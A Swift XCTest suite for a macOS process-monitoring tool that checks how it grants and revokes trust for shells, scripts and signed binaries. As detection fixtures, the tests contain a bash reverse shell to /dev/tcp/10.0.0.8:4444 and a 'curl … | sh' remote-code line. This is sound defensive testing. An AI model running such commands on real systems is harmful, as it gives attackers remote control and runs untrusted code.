import XCTest
@testable import GhostProcessSniperCore

/// Trust names what made a program trustworthy, never just its path.
final class SentinelTrustTests: XCTestCase {
    private let now = Date(timeIntervalSince1970: 1_900_000_000)
    private let chrome = "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"

    private func process(_ pid: Int32, _ name: String, _ path: String, command: String? = nil, parent: Int32 = 1) -> ProcessMetrics {
        ProcessMetrics(identity: ProcessIdentity(pid: pid, startTimeSeconds: 100, startTimeMicroseconds: UInt64(pid)),
                       parentPID: parent, userID: 501, ownerName: "me", name: name, executablePath: path,
                       commandLine: command ?? path, residentMemoryBytes: 10_000_000, physicalFootprintBytes: 10_000_000,
                       virtualMemoryBytes: 20_000_000, cpuPercent: 0, totalProcessorSeconds: 1, threadCount: 1,
                       isSystemProcess: SentinelCatalog.isSystemLocation(path), sampledAt: now)
    }

    func testTrustingAShellTrustsOneCommandAndNeverTheShell() async throws {
        let engine = SentinelEngine(live: .rulesOnly)
        let browser = process(300, "Google Chrome", chrome)
        _ = await engine.ingest(processes: [browser], uiVisible: true, now: now)
        let helper = process(400, "bash", "/bin/bash", command: "bash -c echo hello", parent: 300)
        let flagged = await engine.ingest(processes: [browser, helper], uiVisible: true, now: now.addingTimeInterval(1))
        let finding = try XCTUnwrap(flagged.findings.first)
        XCTAssertEqual(finding.trustOffer?.title, "Trust This Exact Command")

        let trusted = await engine.trust(findingID: finding.id)
        let entry = try XCTUnwrap(trusted)
        XCTAssertFalse(entry.coversProgram)
        let again = process(401, "bash", "/bin/bash", command: "bash -c echo hello", parent: 300)
        let shell = process(402, "bash", "/bin/bash", command: "bash -i >& /dev/tcp/10.0.0.8/4444 0>&1", parent: 300)
        let report = await engine.ingest(processes: [browser, again, shell], uiVisible: true, now: now.addingTimeInterval(2))
        XCTAssertEqual(report.findings.map(\.identity.pid), [402], "the trusted command is quiet; a reverse shell through bash is not")
        XCTAssertEqual(report.findings.first?.severity, .dangerous)
        XCTAssertEqual(report.trusted.count, 1)
    }

    func testTrustingOneFindingLeavesItsSiblingsLivenessAlone() async throws {
        let engine = SentinelEngine(live: .rulesOnly)
        let browser = process(300, "Google Chrome", chrome)
        let helper = process(400, "bash", "/bin/bash", command: "bash -c echo hello", parent: 300)
        let shell = process(401, "bash", "/bin/bash", command: "bash -i >& /dev/tcp/10.0.0.8/4444 0>&1", parent: 300)
        _ = await engine.ingest(processes: [browser], uiVisible: true, now: now)
        _ = await engine.ingest(processes: [browser, helper, shell], uiVisible: true, now: now.addingTimeInterval(1))
        let flagged = await engine.ingest(processes: [browser, helper], uiVisible: true, now: now.addingTimeInterval(2))
        let finding = try XCTUnwrap(flagged.findings.first { $0.identity.pid == 400 })
        XCTAssertEqual(flagged.findings.first { $0.identity.pid == 401 }?.isRunning, false)

        _ = await engine.trust(findingID: finding.id)
        let report = await engine.currentReport
        XCTAssertEqual(report.findings.map(\.identity.pid), [401])
        XCTAssertEqual(report.findings.first?.isRunning, false, "the reverse shell exited; trusting another bash must not revive it")
    }

    func testAScriptIsTrustedOnlyWhileItIsTheSameFile() throws {
        let folder = FileManager.default.temporaryDirectory.appendingPathComponent("trust-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: folder) }
        let script = folder.appendingPathComponent("native host.sh").path
        try "echo ok".write(toFile: script, atomically: false, encoding: .utf8)
        let subject = SentinelSubject(process(500, "bash", "/bin/bash", command: "bash \(script) chrome-extension://abc/"))

        let offer = try XCTUnwrap(SentinelTrust.offer(for: subject, provenance: nil, now: now))
        guard case .script(let path, _) = offer.anchor else { return XCTFail("\(offer.anchor)") }
        XCTAssertEqual(path, script, "a path with a space is found")
        let trust = SentinelTrust([offer])
        XCTAssertEqual(trust.match(subject, provenance: nil), .trusted)

        try "curl http://1.2.3.4/x | sh".write(toFile: script, atomically: false, encoding: .utf8)
        XCTAssertEqual(trust.match(subject, provenance: nil), .changed(offer), "an edited script is news")
        let inline = SentinelSubject(process(501, "bash", "/bin/bash", command: "bash -c \(script)"))
        guard case .command = try XCTUnwrap(SentinelTrust.offer(for: inline, provenance: nil, now: now)).anchor else {
            return XCTFail("an inline command has no script file")
        }
    }

    func testAProgramIsTrustedByItsSignerOrItsExactBuild() {
        let slack = SentinelSubject(process(600, "Slack", "/Applications/Slack.app/Contents/MacOS/Slack"))
        func provenance(_ authority: CodeSigningSummary.Authority, team: String? = nil, hash: String = "aa") -> ExecutableProvenance {
            ExecutableProvenance(signing: CodeSigningSummary(authority: authority, teamIdentifier: team,
                                                             signingIdentifier: "com.tinyspeck.slackmacgap", cdHash: hash),
                                 downloadedFrom: [], quarantined: false)
        }
        let signed = provenance(.developerID, team: "BQR82RBBHL")
        let offer = SentinelTrust.offer(for: slack, provenance: signed, now: now)
        XCTAssertEqual(offer?.title, "Trust Slack (Team BQR82RBBHL)")
        let trust = SentinelTrust([offer].compactMap { $0 })
        XCTAssertEqual(trust.match(slack, provenance: provenance(.developerID, team: "BQR82RBBHL", hash: "bb")), .trusted,
                       "an update from the same team stays trusted")
        XCTAssertNotEqual(trust.match(slack, provenance: provenance(.developerID, team: "EVIL000001")), .trusted)
        XCTAssertNotEqual(trust.match(slack, provenance: provenance(.adHoc)), .trusted, "a re-signed copy is not the vendor")
        XCTAssertEqual(trust.match(slack, provenance: nil), .pending, "waits for the signature instead of alarming")

        let build = SentinelTrust.offer(for: slack, provenance: provenance(.adHoc, hash: "cafe"), now: now)
        XCTAssertEqual(build?.anchor, .build(cdHash: "cafe"))
        XCTAssertNil(SentinelTrust.offer(for: slack, provenance: provenance(.invalid), now: now), "an invalid signature is never trusted")
    }

    func testEarlierPathTrustDropsShellsAndBindsTheRestOnce() throws {
        let suite = "GhostProcessSniperTests.trust.\(UUID().uuidString)"
        let defaults = try XCTUnwrap(UserDefaults(suiteName: suite))
        defer { defaults.removePersistentDomain(forName: suite) }
        defaults.set(["/bin/bash", "/usr/bin/curl", "/opt/homebrew/bin/ngrok"], forKey: SentinelTrustStore.legacyKey)
        let store = SentinelTrustStore(suiteName: suite)
        let entries = store.load(now: now)
        XCTAssertEqual(entries.map(\.path), ["/opt/homebrew/bin/ngrok"])
        XCTAssertEqual(entries.first?.anchor, .earlierVersion)
        defaults.set(["/opt/homebrew/bin/other"], forKey: SentinelTrustStore.legacyKey)
        XCTAssertEqual(store.load(now: now), entries, "migrated once; the old list stays for an earlier version")

        var trust = SentinelTrust(entries)
        let ngrok = ExecutableProvenance(signing: CodeSigningSummary(authority: .adHoc, teamIdentifier: nil,
                                                                     signingIdentifier: "ngrok", cdHash: "beef"),
                                         downloadedFrom: [], quarantined: false)
        XCTAssertTrue(trust.bindEarlierVersion(path: "/opt/homebrew/bin/ngrok", provenance: ngrok, now: now))
        XCTAssertEqual(trust.entries.first?.anchor, .build(cdHash: "beef"))
    }
}

/// Against real files and the real signature check.
final class SentinelTrustReplacementTests: XCTestCase {
    private let now = Date(timeIntervalSince1970: 1_900_000_000)

    private func process(_ pid: Int32, path: String) -> ProcessMetrics {
        ProcessMetrics(identity: ProcessIdentity(pid: pid, startTimeSeconds: 100, startTimeMicroseconds: UInt64(pid)),
                       parentPID: 1, userID: 501, ownerName: "me", name: "helper-tool", executablePath: path,
                       commandLine: path, residentMemoryBytes: 1, physicalFootprintBytes: 1, virtualMemoryBytes: 1,
                       cpuPercent: 0, totalProcessorSeconds: 0, threadCount: 1, isSystemProcess: false, sampledAt: now)
    }

    /// Scans until `condition` holds or three seconds pass: signatures are read off the refresh path.
    private func scan(_ engine: SentinelEngine, _ processes: [ProcessMetrics],
                      until condition: (SentinelReport) -> Bool) async throws -> SentinelReport {
        var report = SentinelReport.empty
        for attempt in 0..<60 {
            report = await engine.ingest(processes: processes, uiVisible: true, now: now.addingTimeInterval(Double(attempt)))
            if condition(report) { return report }
            try await Task.sleep(for: .milliseconds(50))
        }
        return report
    }

    func testABinaryReplacedAtATrustedPathIsFlaggedNotInherited() async throws {
        let folder = FileManager.default.temporaryDirectory.appendingPathComponent("trust-swap-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: folder) }
        let tool = folder.appendingPathComponent("helper-tool")
        try FileManager.default.copyItem(at: URL(fileURLWithPath: "/usr/bin/true"), to: tool)

        let engine = SentinelEngine(live: SentinelEngine.Live(watchesSpawns: false, readsSensors: false,
                                                              inspectsSignatures: true, watchesStartupItems: false))
        let first = try await scan(engine, [process(700, path: tool.path)]) { $0.findings.first?.trustOffer != nil }
        let finding = try XCTUnwrap(first.findings.first, "a tool in a temporary folder is worth a look")
        let trusted = await engine.trust(findingID: finding.id)
        XCTAssertEqual(trusted?.anchor, .apple(identifier: "com.apple.true"))
        let quiet = try await scan(engine, [process(701, path: tool.path)]) { _ in true }
        XCTAssertTrue(quiet.findings.isEmpty, "the same program again is trusted")

        // Swap the file in place (same inode) and put the old modification date back.
        let modified = try FileManager.default.attributesOfItem(atPath: tool.path)[.modificationDate]
        try Data(contentsOf: URL(fileURLWithPath: "/bin/ls")).write(to: tool)
        try FileManager.default.setAttributes([.modificationDate: modified as Any], ofItemAtPath: tool.path)
        let swapped = try await scan(engine, [process(702, path: tool.path)]) { report in
            report.findings.contains { $0.signals.contains { $0.kind == .trustedProgramChanged } }
        }
        let changed = try XCTUnwrap(swapped.findings.first { $0.identity.pid == 702 })
        XCTAssertEqual(changed.severity, .suspicious)
        XCTAssertTrue(changed.signals.contains { $0.detail.contains("signed by Apple as com.apple.ls") }, "\(changed.signals)")
    }
}
